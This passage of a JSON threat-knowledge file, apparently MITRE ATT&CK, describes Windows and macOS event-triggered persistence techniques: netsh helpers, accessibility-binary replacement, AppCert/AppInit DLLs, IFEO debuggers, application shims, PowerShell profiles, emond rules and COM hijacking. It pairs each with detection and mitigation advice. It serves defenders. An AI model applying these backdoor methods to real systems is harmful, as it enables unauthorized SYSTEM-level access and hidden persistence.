trigger execution of arbitrary code in a persistent manner. This execution would take place anytime netsh.exe is executed, which could happen automatically, with another persistence technique, or if other software (ex: VPN) is present on the system that executes netsh.exe as part of its normal functionality. <a href=\"https://github.com/outflankbv/NetshHelperBeacon\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Github Netsh Helper CS Beacon)</a> <a href=\"https://htmlpreview.github.io/?https://github.com/MatthewDemaske/blogbackup/blob/master/netshell.html\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Demaske Netsh Persistence)</a>","detection":"It is likely unusual for netsh.exe to have any child processes in most environments. Monitor process executions and investigate any child processes spawned by netsh.exe for malicious behavior. Monitor the <code>HKLM\\SOFTWARE\\Microsoft\\Netsh</code> registry key for any new or suspicious entries that do not correlate with known system files or benign software. <a href=\"https://htmlpreview.github.io/?https://github.com/MatthewDemaske/blogbackup/blob/master/netshell.html\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Demaske Netsh Persistence)</a>","platforms":["Windows"],"dataSources":["Command: Command Execution","Windows Registry: Windows Registry Key Modification","Module: Module Load","Process: Process Creation"],"mitigations":[]},{"id":"T1546.008","name":"Accessibility Features","description":"Adversaries may establish persistence and/or elevate privileges by executing malicious content triggered by accessibility features. Windows contains accessibility features that may be launched with a key combination before a user has logged in (ex: when the user is on the Windows logon screen). An adversary can modify the way these programs are launched to get a command prompt or backdoor without logging in to the system.\n\nTwo common accessibility programs are <code>C:\\Windows\\System32\\sethc.exe</code>, launched when the shift key is pressed five times and <code>C:\\Windows\\System32\\utilman.exe</code>, launched when the Windows + U key combination is pressed. The sethc.exe program is often referred to as \"sticky keys\", and has been used by adversaries for unauthenticated access through a remote desktop login screen. <a href=\"https://www.fireeye.com/blog/threat-research/2012/08/hikit-rootkit-advanced-persistent-attack-techniques-part-1.html\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: FireEye Hikit Rootkit)</a>\n\nDepending on the version of Windows, an adversary may take advantage of these features in different ways. Common methods used by adversaries include replacing accessibility feature binaries or pointers/references to these binaries in the Registry. In newer versions of Windows, the replaced binary needs to be digitally signed for x64 systems, the binary must reside in <code>%systemdir%\\</code>, and it must be protected by Windows File or Resource Protection (WFP/WRP). <a href=\"https://www.slideshare.net/DennisMaldonado5/sticky-keys-to-the-kingdom\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: DEFCON2016 Sticky Keys)</a> The Image File Execution Options Injection debugger method was likely discovered as a potential workaround because it does not require the corresponding accessibility feature binary to be replaced.\n\nFor simple binary replacement on Windows XP and later as well as and Windows Server 2003/R2 and later, for example, the program (e.g., <code>C:\\Windows\\System32\\utilman.exe</code>) may be replaced with \"cmd.exe\" (or another program that provides backdoor access). Subsequently, pressing the appropriate key combination at the login screen while sitting at the keyboard or when connected over Remote Desktop Protocol will cause the replaced file to be executed with SYSTEM privileges. <a href=\"http://blog.crowdstrike.com/registry-analysis-with-crowdresponse/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Tilbury 2014)</a>\n\nOther accessibility features exist that may also be leveraged in a similar fashion: <a href=\"https://www.slideshare.net/DennisMaldonado5/sticky-keys-to-the-kingdom\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: DEFCON2016 Sticky Keys)</a> <a href=\"https://giuliocomi.blogspot.com/2019/10/abusing-windows-10-narrators-feedback.html\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Narrator Accessibility Abuse)</a>\n\n* On-Screen Keyboard: <code>C:\\Windows\\System32\\osk.exe</code>\n* Magnifier: <code>C:\\Windows\\System32\\Magnify.exe</code>\n* Narrator: <code>C:\\Windows\\System32\\Narrator.exe</code>\n* Display Switcher: <code>C:\\Windows\\System32\\DisplaySwitch.exe</code>\n* App Switcher: <code>C:\\Windows\\System32\\AtBroker.exe</code>","detection":"Changes to accessibility utility binaries or binary paths that do not correlate with known software, patch cycles, etc., are suspicious. Command line invocation of tools capable of modifying the Registry for associated keys are also suspicious. Utility arguments and the binaries themselves should be monitored for changes. Monitor Registry keys within <code>HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options</code>.","platforms":["Windows"],"dataSources":["Process: Process Creation","Command: Command Execution","File: File Creation","File: File Modification","Windows Registry: Windows Registry Key Modification"],"mitigations":[{"id":"M1028","name":"Operating System Configuration","description":"To use this technique remotely, an adversary must use it in conjunction with RDP. Ensure that Network Level Authentication is enabled to force the remote desktop session to authenticate before the session is created and the login screen displayed. It is enabled by default on Windows Vista and later. <a href=\"https://technet.microsoft.com/en-us/library/cc732713.aspx\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: TechNet RDP NLA)</a>"},{"id":"M1035","name":"Limit Access to Resource Over Network","description":"If possible, use a Remote Desktop Gateway to manage connections and security configuration of RDP within a network. <a href=\"https://technet.microsoft.com/en-us/library/cc731150.aspx\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: TechNet RDP Gateway)</a>"},{"id":"M1038","name":"Execution Prevention","description":"Adversaries can replace accessibility features binaries with alternate binaries to execute this technique. Identify and block potentially malicious software executed through accessibility features functionality by using application control <a href=\"http://www.sans.org/reading-room/whitepapers/application/application-whitelisting-panacea-propaganda-33599\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Beechey 2010)</a> tools, like Windows Defender Application Control <a href=\"https://docs.microsoft.com/en-us/windows/security/threat-protection/windows-defender-application-control/windows-defender-application-control\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Microsoft Windows Defender Application Control)</a>, AppLocker, <a href=\"https://blogs.jpcert.or.jp/en/2016/01/windows-commands-abused-by-attackers.html\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Windows Commands JPCERT)</a> <a href=\"https://apps.nsa.gov/iaarchive/library/ia-guidance/tech-briefs/application-whitelisting-using-microsoft-applocker.cfm\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: NSA MS AppLocker)</a> or Software Restriction Policies <a href=\"http://technet.microsoft.com/en-us/magazine/2008.06.srp.aspx\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Corio 2008)</a> where appropriate. <a href=\"https://technet.microsoft.com/en-us/library/ee791851.aspx\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: TechNet Applocker vs SRP)</a>"}]},{"id":"T1546.009","name":"AppCert DLLs","description":"Adversaries may establish persistence and/or elevate privileges by executing malicious content triggered by AppCert DLLs loaded into processes. Dynamic-link libraries (DLLs) that are specified in the <code>AppCertDLLs</code> Registry key under <code>HKEY_LOCAL_MACHINE\\System\\CurrentControlSet\\Control\\Session Manager\\</code> are loaded into every process that calls the ubiquitously used application programming interface (API) functions <code>CreateProcess</code>, <code>CreateProcessAsUser</code>, <code>CreateProcessWithLoginW</code>, <code>CreateProcessWithTokenW</code>, or <code>WinExec</code>. <a href=\"https://www.endgame.com/blog/technical-blog/ten-process-injection-techniques-technical-survey-common-and-trending-process\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Elastic Process Injection July 2017)</a>\n\nSimilar to Process Injection, this value can be abused to obtain elevated privileges by causing a malicious DLL to be loaded and run in the context of separate processes on the computer. Malicious AppCert DLLs may also provide persistence by continuously being triggered by API activity.","detection":"Monitor DLL loads by processes, specifically looking for DLLs that are not recognized or not normally loaded into a process. Monitor the AppCertDLLs Registry value for modifications that do not correlate with known software, patch cycles, etc. Monitor and analyze application programming interface (API) calls that are indicative of Registry edits such as RegCreateKeyEx and RegSetValueEx. <a href=\"https://www.endgame.com/blog/technical-blog/ten-process-injection-techniques-technical-survey-common-and-trending-process\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Elastic Process Injection July 2017)</a> \n\nTools such as Sysinternals Autoruns may overlook AppCert DLLs as an auto-starting location. <a href=\"https://technet.microsoft.com/en-us/sysinternals/bb963902\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: TechNet Autoruns)</a> <a href=\"https://forum.sysinternals.com/appcertdlls_topic12546.html\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Sysinternals AppCertDlls Oct 2007)</a>\n\nLook for abnormal process behavior that may be due to a process loading a malicious DLL. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as making network connections for Command and Control, learning details about the environment through Discovery, and conducting Lateral Movement.","platforms":["Windows"],"dataSources":["Module: Module Load","Command: Command Execution","Process: OS API Execution","Windows Registry: Windows Registry Key Modification","Process: Process Creation"],"mitigations":[{"id":"M1038","name":"Execution Prevention","description":"Adversaries install new AppCertDLL binaries to execute this technique. Identify and block potentially malicious software executed through AppCertDLLs functionality by using application control <a href=\"http://www.sans.org/reading-room/whitepapers/application/application-whitelisting-panacea-propaganda-33599\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Beechey 2010)</a> tools, like Windows Defender Application Control <a href=\"https://docs.microsoft.com/en-us/windows/security/threat-protection/windows-defender-application-control/windows-defender-application-control\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Microsoft Windows Defender Application Control)</a>, AppLocker, <a href=\"https://blogs.jpcert.or.jp/en/2016/01/windows-commands-abused-by-attackers.html\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Windows Commands JPCERT)</a> <a href=\"https://apps.nsa.gov/iaarchive/library/ia-guidance/tech-briefs/application-whitelisting-using-microsoft-applocker.cfm\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: NSA MS AppLocker)</a> or Software Restriction Policies <a href=\"http://technet.microsoft.com/en-us/magazine/2008.06.srp.aspx\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Corio 2008)</a> where appropriate. <a href=\"https://technet.microsoft.com/en-us/library/ee791851.aspx\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: TechNet Applocker vs SRP)</a>"}]},{"id":"T1546.010","name":"AppInit DLLs","description":"Adversaries may establish persistence and/or elevate privileges by executing malicious content triggered by AppInit DLLs loaded into processes. Dynamic-link libraries (DLLs) that are specified in the <code>AppInit_DLLs</code> value in the Registry keys <code>HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Windows</code> or <code>HKEY_LOCAL_MACHINE\\Software\\Wow6432Node\\Microsoft\\Windows NT\\CurrentVersion\\Windows</code> are loaded by user32.dll into every process that loads user32.dll. In practice this is nearly every program, since user32.dll is a very common library. <a href=\"https://www.endgame.com/blog/technical-blog/ten-process-injection-techniques-technical-survey-common-and-trending-process\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Elastic Process Injection July 2017)</a>\n\nSimilar to Process Injection, these values can be abused to obtain elevated privileges by causing a malicious DLL to be loaded and run in the context of separate processes on the computer. <a href=\"https://support.microsoft.com/en-us/kb/197571\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: AppInit Registry)</a> Malicious AppInit DLLs may also provide persistence by continuously being triggered by API activity. \n\nThe AppInit DLL functionality is disabled in Windows 8 and later versions when secure boot is enabled. <a href=\"https://msdn.microsoft.com/en-us/library/dn280412\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: AppInit Secure Boot)</a>","detection":"Monitor DLL loads by processes that load user32.dll and look for DLLs that are not recognized or not normally loaded into a process. Monitor the AppInit_DLLs Registry values for modifications that do not correlate with known software, patch cycles, etc. Monitor and analyze application programming interface (API) calls that are indicative of Registry edits such as <code>RegCreateKeyEx</code> and <code>RegSetValueEx</code>. <a href=\"https://www.endgame.com/blog/technical-blog/ten-process-injection-techniques-technical-survey-common-and-trending-process\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Elastic Process Injection July 2017)</a>\n\nTools such as Sysinternals Autoruns may also be used to detect system changes that could be attempts at persistence, including listing current AppInit DLLs. <a href=\"https://technet.microsoft.com/en-us/sysinternals/bb963902\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: TechNet Autoruns)</a> \n\nLook for abnormal process behavior that may be due to a process loading a malicious DLL. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as making network connections for Command and Control, learning details about the environment through Discovery, and conducting Lateral Movement.","platforms":["Windows"],"dataSources":["Process: Process Creation","Command: Command Execution","Module: Module Load","Windows Registry: Windows Registry Key Modification","Process: OS API Execution"],"mitigations":[{"id":"M1038","name":"Execution Prevention","description":"Adversaries can install new AppInit DLLs binaries to execute this technique. Identify and block potentially malicious software executed through AppInit DLLs functionality by using application control <a href=\"http://www.sans.org/reading-room/whitepapers/application/application-whitelisting-panacea-propaganda-33599\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Beechey 2010)</a> tools, like Windows Defender Application Control <a href=\"https://docs.microsoft.com/en-us/windows/security/threat-protection/windows-defender-application-control/windows-defender-application-control\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Microsoft Windows Defender Application Control)</a>, AppLocker, <a href=\"https://blogs.jpcert.or.jp/en/2016/01/windows-commands-abused-by-attackers.html\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Windows Commands JPCERT)</a> <a href=\"https://apps.nsa.gov/iaarchive/library/ia-guidance/tech-briefs/application-whitelisting-using-microsoft-applocker.cfm\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: NSA MS AppLocker)</a> or Software Restriction Policies <a href=\"http://technet.microsoft.com/en-us/magazine/2008.06.srp.aspx\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Corio 2008)</a> where appropriate. <a href=\"https://technet.microsoft.com/en-us/library/ee791851.aspx\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: TechNet Applocker vs SRP)</a>"},{"id":"M1051","name":"Update Software","description":"Upgrade to Windows 8 or later and enable secure boot."}]},{"id":"T1546.011","name":"Application Shimming","description":"Adversaries may establish persistence and/or elevate privileges by executing malicious content triggered by application shims. The Microsoft Windows Application Compatibility Infrastructure/Framework (Application Shim) was created to allow for backward compatibility of software as the operating system codebase changes over time. For example, the application shimming feature allows developers to apply fixes to applications (without rewriting code) that were created for Windows XP so that it will work with Windows 10. <a href=\"https://www.endgame.com/blog/technical-blog/ten-process-injection-techniques-technical-survey-common-and-trending-process\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Elastic Process Injection July 2017)</a>\n\nWithin the framework, shims are created to act as a buffer between the program (or more specifically, the Import Address Table) and the Windows OS. When a program is executed, the shim cache is referenced to determine if the program requires the use of the shim database (.sdb). If so, the shim database uses hooking to redirect the code as necessary in order to communicate with the OS. \n\nA list of all shims currently installed by the default Windows installer (sdbinst.exe) is kept in:\n\n* <code>%WINDIR%\\AppPatch\\sysmain.sdb</code> and\n* <code>hklm\\software\\microsoft\\windows nt\\currentversion\\appcompatflags\\installedsdb</code>\n\nCustom databases are stored in:\n\n* <code>%WINDIR%\\AppPatch\\custom &amp; %WINDIR%\\AppPatch\\AppPatch64\\Custom</code> and\n* <code>hklm\\software\\microsoft\\windows nt\\currentversion\\appcompatflags\\custom</code>\n\nTo keep shims secure, Windows designed them to run in user mode so they cannot modify the kernel and you must have administrator privileges to install a shim. However, certain shims can be used to Bypass User Account Control (UAC and RedirectEXE), inject DLLs into processes (InjectDLL), disable Data Execution Prevention (DisableNX) and Structure Exception Handling (DisableSEH), and intercept memory addresses (GetProcAddress).\n\nUtilizing these shims may allow an adversary to perform several malicious acts such as elevate privileges, install backdoors, disable defenses like Windows Defender, etc. <a href=\"http://files.brucon.org/2015/Tomczak_and_Ballenthin_Shims_for_the_Win.pdf\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: FireEye Application Shimming)</a> Shims can also be abused to establish persistence by continuously being invoked by affected programs.","detection":"There are several public tools available that will detect shims that are currently available <a href=\"https://www.blackhat.com/docs/eu-15/materials/eu-15-Pierce-Defending-Against-Malicious-Application-Compatibility-Shims-wp.pdf\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Black Hat 2015 App Shim)</a>:\n\n* Shim-Process-Scanner - checks memory of every running process for any shim flags\n* Shim-Detector-Lite - detects installation of custom shim databases\n* Shim-Guard - monitors registry for any shim installations\n* ShimScanner - forensic tool to find active shims in memory\n* ShimCacheMem - Volatility plug-in that pulls shim cache from memory (note: shims are only cached after reboot)\n\nMonitor process execution for sdbinst.exe and command-line arguments for potential indications of application shim abuse.","platforms":["Windows"],"dataSources":["File: File Modification","Module: Module Load","Windows Registry: Windows Registry Key Modification","Command: Command Execution","Process: Process Creation"],"mitigations":[{"id":"M1051","name":"Update Software","description":"Microsoft released an optional patch update - KB3045645 - that will remove the \"auto-elevate\" flag within the sdbinst.exe. This will prevent use of application shimming to bypass UAC."},{"id":"M1052","name":"User Account Control","description":"Changing UAC settings to \"Always Notify\" will give the user more visibility when UAC elevation is requested, however, this option will not be popular among users due to the constant UAC interruptions."}]},{"id":"T1546.012","name":"Image File Execution Options Injection","description":"Adversaries may establish persistence and/or elevate privileges by executing malicious content triggered by Image File Execution Options (IFEO) debuggers. IFEOs enable a developer to attach a debugger to an application. When a process is created, a debugger present in an application’s IFEO will be prepended to the application’s name, effectively launching the new process under the debugger (e.g., <code>C:\\dbg\\ntsd.exe -g  notepad.exe</code>). <a href=\"https://blogs.msdn.microsoft.com/mithuns/2010/03/24/image-file-execution-options-ifeo/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Microsoft Dev Blog IFEO Mar 2010)</a>\n\nIFEOs can be set directly via the Registry or in Global Flags via the GFlags tool. <a href=\"https://docs.microsoft.com/windows-hardware/drivers/debugger/gflags-overview\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Microsoft GFlags Mar 2017)</a> IFEOs are represented as <code>Debugger</code> values in the Registry under <code>HKLM\\SOFTWARE{\\Wow6432Node}\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\&lt;executable&gt;</code> where <code>&amp;lt;executable&amp;gt;</code> is the binary on which the debugger is attached. <a href=\"https://blogs.msdn.microsoft.com/mithuns/2010/03/24/image-file-execution-options-ifeo/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Microsoft Dev Blog IFEO Mar 2010)</a>\n\nIFEOs can also enable an arbitrary monitor program to be launched when a specified program silently exits (i.e. is prematurely terminated by itself or a second, non kernel-mode process). <a href=\"https://docs.microsoft.com/windows-hardware/drivers/debugger/registry-entries-for-silent-process-exit\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Microsoft Silent Process Exit NOV 2017)</a> <a href=\"https://oddvar.moe/2018/04/10/persistence-using-globalflags-in-image-file-execution-options-hidden-from-autoruns-exe/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Oddvar Moe IFEO APR 2018)</a> Similar to debuggers, silent exit monitoring can be enabled through GFlags and/or by directly modifying IFEO and silent process exit Registry values in <code>HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\SilentProcessExit\\</code>. <a href=\"https://docs.microsoft.com/windows-hardware/drivers/debugger/registry-entries-for-silent-process-exit\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Microsoft Silent Process Exit NOV 2017)</a> <a href=\"https://oddvar.moe/2018/04/10/persistence-using-globalflags-in-image-file-execution-options-hidden-from-autoruns-exe/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Oddvar Moe IFEO APR 2018)</a>\n\nSimilar to Accessibility Features, on Windows Vista and later as well as Windows Server 2008 and later, a Registry key may be modified that configures \"cmd.exe,\" or another program that provides backdoor access, as a \"debugger\" for an accessibility program (ex: utilman.exe). After the Registry is modified, pressing the appropriate key combination at the login screen while at the keyboard or when connected with Remote Desktop Protocol will cause the \"debugger\" program to be executed with SYSTEM privileges. <a href=\"http://blog.crowdstrike.com/registry-analysis-with-crowdresponse/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Tilbury 2014)</a>\n\nSimilar to Process Injection, these values may also be abused to obtain privilege escalation by causing a malicious executable to be loaded and run in the context of separate processes on the computer. <a href=\"https://www.endgame.com/blog/technical-blog/ten-process-injection-techniques-technical-survey-common-and-trending-process\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Elastic Process Injection July 2017)</a> Installing IFEO mechanisms may also provide Persistence via continuous triggered invocation.\n\nMalware may also use IFEO to impair defenses by registering invalid debuggers that redirect and effectively disable various system and security applications. <a href=\"https://www.f-secure.com/v-descs/backdoor_w32_hupigon_emv.shtml\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: FSecure Hupigon)</a> <a href=\"https://www.symantec.com/security_response/writeup.jsp?docid=2008-062807-2501-99&tabid=2\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Symantec Ushedix June 2008)</a>","detection":"Monitor for abnormal usage of the GFlags tool as well as common processes spawned under abnormal parents and/or with creation flags indicative of debugging such as <code>DEBUG_PROCESS</code> and <code>DEBUG_ONLY_THIS_PROCESS</code>. <a href=\"https://blogs.msdn.microsoft.com/mithuns/2010/03/24/image-file-execution-options-ifeo/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Microsoft Dev Blog IFEO Mar 2010)</a>\n\nMonitor Registry values associated with IFEOs, as well as silent process exit monitoring, for modifications that do not correlate with known software, patch cycles, etc. Monitor and analyze application programming interface (API) calls that are indicative of Registry edits such as <code>RegCreateKeyEx</code> and <code>RegSetValueEx</code>. <a href=\"https://www.endgame.com/blog/technical-blog/ten-process-injection-techniques-technical-survey-common-and-trending-process\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Elastic Process Injection July 2017)</a>","platforms":["Windows"],"dataSources":["Command: Command Execution","Windows Registry: Windows Registry Key Modification","Process: Process Creation"],"mitigations":[]},{"id":"T1546.013","name":"PowerShell Profile","description":"Adversaries may gain persistence and elevate privileges by executing malicious content triggered by PowerShell profiles. A PowerShell profile  (<code>profile.ps1</code>) is a script that runs when PowerShell starts and can be used as a logon script to customize user environments.\n\nPowerShell supports several profiles depending on the user or host program. For example, there can be different profiles for PowerShell host programs such as the PowerShell console, PowerShell ISE or Visual Studio Code. An administrator can also configure a profile that applies to all users and host programs on the local computer. <a href=\"https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_profiles?view=powershell-6\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Microsoft About Profiles)</a> \n\nAdversaries may modify these profiles to include arbitrary commands, functions, modules, and/or PowerShell drives to gain persistence. Every time a user opens a PowerShell session the modified script will be executed unless the <code>-NoProfile</code> flag is used when it is launched. <a href=\"https://www.welivesecurity.com/2019/05/29/turla-powershell-usage/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: ESET Turla PowerShell May 2019)</a> \n\nAn adversary may also be able to escalate privileges if a script in a PowerShell profile is loaded and executed by an account with higher privileges, such as a domain administrator. <a href=\"https://witsendandshady.blogspot.com/2019/06/lab-notes-persistence-and-privilege.html\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Wits End and Shady PowerShell Profiles)</a>","detection":"Locations where <code>profile.ps1</code> can be stored should be monitored for new profiles or modifications. <a href=\"http://www.malwarearchaeology.com/s/Windows-PowerShell-Logging-Cheat-Sheet-ver-June-2016-v2.pdf\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Malware Archaeology PowerShell Cheat Sheet)</a> <a href=\"https://docs.microsoft.com/powershell/module/microsoft.powershell.core/about/about_profiles\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Microsoft Profiles)</a> Example profile locations (user defaults as well as program-specific) include:\n\n* <code>$PsHome\\Profile.ps1</code>\n* <code>$PsHome\\Microsoft.{HostProgram}_profile.ps1</code>\n* <code>$Home\\\\\\[My ]Documents\\PowerShell\\Profile.ps1</code>\n* <code>$Home\\\\\\[My ]Documents\\PowerShell\\Microsoft.{HostProgram}_profile.ps1</code>\n\nMonitor abnormal PowerShell commands, unusual loading of PowerShell drives or modules, and/or execution of unknown programs.","platforms":["Windows"],"dataSources":["File: File Modification","Command: Command Execution","Process: Process Creation","File: File Creation"],"mitigations":[{"id":"M1022","name":"Restrict File and Directory Permissions","description":"Making PowerShell profiles immutable and only changeable by certain administrators will limit the ability for adversaries to easily create user level persistence."},{"id":"M1045","name":"Code Signing","description":"Enforce execution of only signed PowerShell scripts. Sign profiles to avoid them from being modified."},{"id":"M1054","name":"Software Configuration","description":"Avoid PowerShell profiles if not needed. Use the -No Profile flag with when executing PowerShell scripts remotely to prevent local profiles and scripts from being executed."}]},{"id":"T1546.014","name":"Emond","description":"Adversaries may gain persistence and elevate privileges by executing malicious content triggered by the Event Monitor Daemon (emond). Emond is a Launch Daemon that accepts events from various services, runs them through a simple rules engine, and takes action. The emond binary at <code>/sbin/emond</code> will load any rules from the <code>/etc/emond.d/rules/</code> directory and take action once an explicitly defined event takes place.\n\nThe rule files are in the plist format and define the name, event type, and action to take. Some examples of event types include system startup and user authentication. Examples of actions are to run a system command or send an email. The emond service will not launch if there is no file present in the QueueDirectories path <code>/private/var/db/emondClients</code>, specified in the Launch Daemon configuration file at<code>/System/Library/LaunchDaemons/com.apple.emond.plist</code>. <a href=\"https://www.xorrior.com/emond-persistence/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: xorrior emond Jan 2018)</a> <a href=\"http://www.magnusviri.com/Mac/what-is-emond.html\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: magnusviri emond Apr 2016)</a> <a href=\"https://www.sentinelone.com/blog/how-malware-persists-on-macos/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: sentinelone macos persist Jun 2019)</a>\n\nAdversaries may abuse this service by writing a rule to execute commands when a defined event occurs, such as system start up or user authentication. <a href=\"https://www.xorrior.com/emond-persistence/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: xorrior emond Jan 2018)</a> <a href=\"http://www.magnusviri.com/Mac/what-is-emond.html\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: magnusviri emond Apr 2016)</a> <a href=\"https://www.sentinelone.com/blog/how-malware-persists-on-macos/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: sentinelone macos persist Jun 2019)</a> Adversaries may also be able to escalate privileges from administrator to root as the emond service is executed with root privileges by the Launch Daemon service.","detection":"Monitor emond rules creation by checking for files created or modified in <code>/etc/emond.d/rules/</code> and <code>/private/var/db/emondClients</code>.","platforms":["macOS"],"dataSources":["File: File Creation","Command: Command Execution","Process: Process Creation","File: File Modification"],"mitigations":[{"id":"M1042","name":"Disable or Remove Feature or Program","description":"Consider disabling emond by removing the Launch Daemon plist file."}]},{"id":"T1546.015","name":"Component Object Model Hijacking","description":"Adversaries may establish persistence by executing malicious content triggered by hijacked references to Component Object Model (COM) objects. COM is a system within Windows to enable interaction between software components through the operating system. <a href=\"https://msdn.microsoft.com/library/ms694363.aspx\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Microsoft Component Object Model)</a>  References to various COM objects are stored in the Registry. \n\nAdversaries may use the COM system to insert malicious code that can be executed in place of legitimate software through hijacking the COM references and relationships as a means for persistence. Hijacking a COM object requires a change in the Registry to replace a reference to a legitimate system component which may cause that component to not work when executed. When that system component is executed through normal system operation the adversary's code will be executed instead. <a href=\"https://blog.gdatasoftware.com/2014/10/23941-com-object-hijacking-the-discreet-way-of-persistence\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: GDATA COM Hijacking)</a> An adversary is likely to hijack objects that are used frequently enough to maintain a consistent level of persistence, but are unlikely to break noticeable functionality within the system as to avoid system instability that could lead to detection. \n\nOne variation of COM hijacking involves abusing Type Libraries (TypeLibs), which provide metadata about COM objects, such as their interfaces and methods. Adversaries may modify Registry keys associated with TypeLibs to redirect legitimate COM object functionality to malicious scripts or payloads. Unlike traditional COM hijacking, which commonly uses local DLLs, this variation may leverage the \"script:\" moniker to execute remote scripts hosted on external servers. <a href=\"https://reliaquest.com/blog/threat-spotlight-hijacked-and-hidden-new-backdoor-and-persistence-technique/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: RELIAQUEST)</a> This approach enables stealthy execution of code while maintaining persistence, as the remote payload would be automatically downloaded whenever the hijacked COM object is accessed.","detection":"There are opportunities to detect COM hijacking by searching for Registry references that have been replaced and through Registry operations (ex: Reg) replacing known binary paths with unknown paths or otherwise malicious content. Even though some third-party applications define user COM objects, the presence of objects within HKEY_CURRENT_USER\\Software\\Classes\\CLSID\\ may be anomalous and should be investigated since user objects will be loaded prior to machine objects in HKEY_LOCAL_MACHINE\\SOFTWARE\\Classes\\CLSID\\. <a href=\"https://www.elastic.co/blog/how-hunt-detecting-persistence-evasion-com\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Elastic COM Hijacking)</a> Registry entries for existing COM objects may change infrequently. When an entry with a known good path and binary is replaced or changed to an unusual value to point to an unknown binary in a new location, then it may indicate suspicious behavior and should be investigated.  \n\nLikewise, if software DLL loads are collected and analyzed, any unusual DLL load that can be correlated with a COM object Registry modification may indicate COM hijacking has been performed.","platforms":["Windows"],"dataSources":["Process: Process Creation","Module: Module Load","Windows Registry: Windows Registry Key Modification","Command: Command Execution"],"mitigations":[]},{"id":"T1546.016","name":"Installer Packages","description":"Adversaries may establish persistence and elevate privileges by using an installer to trigger the execution of malicious content. Installer packages are OS specific and contain the resources an operating system needs to install applications on a system. Installer packages can include scripts that run prior to installation as well as after installation is complete. Installer scripts may inherit elevated permissions when executed. Developers often use these scripts to prepare the environment for installation, check requirements, download dependencies, and remove files after installation. <a 